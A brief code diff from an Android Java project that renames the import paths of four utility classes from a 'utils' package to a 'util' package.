@@ -17,10 +17,10 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Status;
-import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
-import com.ht.RCSAndroidGUI.utils.Utils;
-import com.ht.RCSAndroidGUI.utils.WChar;
+import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
+import com.ht.RCSAndroidGUI.util.Utils;
+import com.ht.RCSAndroidGUI.util.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
